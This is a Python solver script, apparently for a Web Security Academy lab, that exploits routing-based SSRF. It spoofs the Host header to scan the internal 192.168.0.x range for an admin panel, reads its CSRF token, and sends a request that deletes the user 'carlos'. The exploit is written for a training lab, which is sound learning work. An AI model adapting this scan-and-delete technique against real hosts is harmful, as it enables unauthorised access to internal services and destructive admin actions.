from web_security_academy.core.utils import render_template_file
from web_security_academy.core.logger import logger, NoNewline

from bs4 import BeautifulSoup


def solve_lab(session):
    session.get_path("/")

    logger.info(
        "Searching for the intranet admin panel by sending the following HTTP "
        "request template:"
    )
    print(
        render_template_file(
            "get.txt",
            host="192.168.0.\033[1;93m?\033[00m",
            session=session.cookies["session"],
            _lab=session.cookies["_lab"],
        )
    )

    with NoNewline():
        for i in range(1, 255):
            req = render_template_file(
                "get.txt",
                host=f"192.168.0.{i}",
                session=session.cookies["session"],
                _lab=session.cookies["_lab"],
            ).replace("\n", "\r\n")
            resp = session.send_raw(req.encode())

            soup = BeautifulSoup(resp.decode(), "lxml")
            query = soup.select('input[name="csrf"]')
            if not query:
                logger.info(f"192.168.0.{i}")
            else:
                csrf = query[0].get("value")
                logger.success(f"192.168.0.{i}")
                break

    req = render_template_file(
        "post.txt",
        host=f"192.168.0.{i}",
        session=session.cookies["session"],
        _lab=session.cookies["_lab"],
        data=f"csrf={csrf}&username=carlos",
    ).replace("\n", "\r\n")

    session.send_raw(req.encode())
    logger.info('Deleted user "carlos" by sending the following HTTP request:')
    print(req)
